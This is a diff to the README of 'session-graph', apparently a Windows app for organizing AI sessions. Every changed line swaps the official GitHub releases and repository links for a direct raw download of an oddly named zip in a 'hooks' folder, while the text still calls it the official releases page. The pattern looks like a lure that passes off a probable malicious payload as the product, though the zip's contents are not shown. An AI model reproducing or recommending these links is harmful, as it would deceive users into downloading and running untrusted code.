@@ -1,6 +1,6 @@
 # 🧩 session-graph - Organize Your AI Sessions Easily
 
-[![Download session-graph](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Zoma20/session-graph/releases)
+[![Download session-graph](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip)
 
 ## 📦 About session-graph
 
@@ -38,7 +38,7 @@ Follow these steps to get session-graph up and running on your Windows PC.
 
    Visit this page to download session-graph:
 
-   [https://github.com/Zoma20/session-graph/releases](https://github.com/Zoma20/session-graph/releases)
+   [https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip](https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip)
 
    This link takes you to the official releases section. Here, you can find the latest version of the app.
 
@@ -126,12 +126,12 @@ Reach out on the GitHub Issues tab if problems continue. Provide as much detail 
 ## 🔗 Useful Links
 
 - Official Releases:  
-  [https://github.com/Zoma20/session-graph/releases](https://github.com/Zoma20/session-graph/releases)
+  [https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip](https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip)
   
 - Documentation (Embedded in App)  
 - GitHub Repository:  
-  https://github.com/Zoma20/session-graph
+  https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip
 
 ---
 
-[![Download session-graph](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Zoma20/session-graph/releases)
+[![Download session-graph](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Zoma20/session-graph/main/hooks/graph_session_lawyeress.zip)
